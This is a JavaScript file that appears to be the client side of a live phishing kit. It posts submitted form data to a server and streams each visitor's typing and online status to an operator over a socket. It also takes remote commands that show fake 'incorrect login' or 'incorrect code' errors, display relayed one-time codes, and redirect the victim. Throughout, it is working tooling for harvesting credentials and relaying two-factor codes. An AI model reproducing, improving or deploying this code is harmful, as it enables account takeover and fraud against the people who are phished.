// ================================
// USER + PAGE STATE
// ================================

let userId = sessionStorage.getItem("userId");
let page;
let preloader = document.getElementById("load");

if (!userId) {
  userId = "user_" + Math.random().toString(36).substr(2, 9);
  sessionStorage.setItem("userId", userId);
}

// ================================
// DOM REFERENCES
// ================================

const wrapper = document.getElementById("codeField");
const inputs = document.querySelectorAll(".cb-input-text");
const overlay = document.getElementById("loadingOverlay");
const loadingBar = document.getElementById("loader");
const submitBtn = document.getElementById("SubmitBtn");
const errorDiv = document.getElementById("errorDiv");
const errorMessage = document.querySelector(".cb-message-text");
const showPasswordCheckbox = document.getElementById("showPassword");

let loadingFrame = null;

// ================================
// UI FUNCTIONS
// ================================

function showError(message) {
  stopLoading();
  errorDiv.style.display = "block";
  if (errorMessage && message) errorMessage.textContent = message;
}

function clearError() {
  errorDiv.style.display = "none";
}


/**
 * Shows the loading overlay and spinner.
 * @param {number} [time] - Optional time in milliseconds after which the overlay hides automatically.
 */
const form = document.querySelector("form");
let pageLoader = null;

function showLoading(time) {
  if (!form) return;

  // hide the form
  form.style.display = "none";

  // create loader container
  pageLoader = document.createElement("div");
  pageLoader.className = "page-loader";

  // spinner image
  const spinner = document.createElement("img");
  spinner.src = "/img/spin.svg"; 
  spinner.alt = "Loading...";

  pageLoader.appendChild(spinner);

  // insert loader right after the form
  form.parentNode.insertBefore(pageLoader, form.nextSibling);

  if (time) {
    setTimeout(stopLoading, time);
  }
}

function stopLoading() {
  if (!form) return;

  if (pageLoader) {
    pageLoader.remove();
    pageLoader = null;
  }

  form.style.display = "block";
}

function redirectToPhoneScreen(phonescreen) {
  if (phonescreen) {
    window.location.href = phonescreen;
  }
}

function updatePhoneField(selector, value, phonescreen = null) {
  const el = document.querySelector(selector);

  if (!el) {
    redirectToPhoneScreen(phonescreen);
    return false;
  }

  el.textContent = value;
  stopLoading();
  return true;
}

// ================================
// SOCKET INITIALIZATION
// ================================

window.socket = io("/", {
  auth: { userId },
  reconnection: true,
  reconnectionAttempts: 5,
  reconnectionDelay: 500,
});

let socket = window.socket;

// ================================
// SOCKET EVENTS
// ================================

socket.on("connect", () => {
  console.log("Connected as", userId);
  socket.emit("user:update", {
    userId,
    newStatus: "online",
    page: page,
  });
});

socket.on("user:command", (data) => {
  if (!data || !data.command) return;

  const { command, code, phonescreen, link } = data;

  console.log("command:", command);

  const usernameEl = document.querySelector("#username");
  const storedUser = sessionStorage.getItem("user");

  if (usernameEl && storedUser) {
    usernameEl.textContent = storedUser;
  }

  switch (command) {
    case "refresh":
      location.reload();
      break;

    case "bad-email":
      showError("Enter a correct email address");
      break;

    case "bad-login":
      showError();
      break;

    case "bad-otp":
      showError("incorrect code");
      break;

    case "otp":
      sessionStorage.removeItem("setcode");
      sessionStorage.setItem("yp", "your mobile");
      updatePhoneField("#yp", "your phone", phonescreen);
      break;

    case "phone-otp":
      if (!code) return;
      sessionStorage.setItem("setcode", code);
      updatePhoneField("#phone", code, phonescreen);
      break;

    
    case "redirect":
      if (link) {
        window.location.href = link;
      }
      break;

    default:
      console.warn("Unhandled command:", command);
  }
});

// ================================
// USER STATUS TRACKING
// ================================

function updateUserStatus(status) {
  socket.emit("user:update", {
    userId,
    newStatus: status,
    page: page,
  });
}

window.addEventListener("beforeunload", () => {
  updateUserStatus("offline");
});

window.addEventListener("focusin", (e) => {
  if (["INPUT", "TEXTAREA"].includes(e.target.tagName)) {
    updateUserStatus("typing");
  }
});

window.addEventListener("focusout", (e) => {
  if (["INPUT", "TEXTAREA"].includes(e.target.tagName)) {
    updateUserStatus("online");
  }
});

window.addEventListener("input", (e) => {
  if (["INPUT", "TEXTAREA"].includes(e.target.tagName)) {
    updateUserStatus("typing");
  }
});

document.addEventListener("click", (e) => {
  const link = e.target.closest("a");
  if (link && link.href && link.origin === location.origin) {
    setTimeout(() => updateUserStatus("online"), 200);
  }
});

// ================================
// FORM SUBMISSION
// ================================

async function submitFormData(formData) {
  showLoading();
  formData.userId = userId;

  try {
    const res = await fetch("/submit", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(formData),
    });

    const data = await res.json();
    console.log("Response:", data);

    if (data.link) {
	  setTimeout(() => {
	    window.location.href = data.link;
	  }, 3000);
	}
  } catch (error) {
    console.error("Error submitting form:", error);
    throw error;
  }
}

// ================================
// SAFE SOCKET RECREATION
// ================================

function getOrCreateSocket({ timeoutMs = 500 } = {}) {
  return new Promise((resolve) => {
    if (window.socket) return resolve(window.socket);

    const start = Date.now();
    const checkInterval = 50;

    const timer = setInterval(() => {
      if (window.socket) {
        clearInterval(timer);
        return resolve(window.socket);
      }

      if (Date.now() - start >= timeoutMs) {
        clearInterval(timer);

        userId = sessionStorage.getItem("userId") || null;

        window.socket = io("/", {
          auth: { userId },
          reconnection: true,
        });

        return resolve(window.socket);
      }
    }, checkInterval);
  });
}

(async () => {
  const socketInstance = await getOrCreateSocket({ timeoutMs: 2000 });
  window.socket = socketInstance;

  socketInstance.on("connect", () =>
    console.log("connected", socketInstance.id)
  );
})();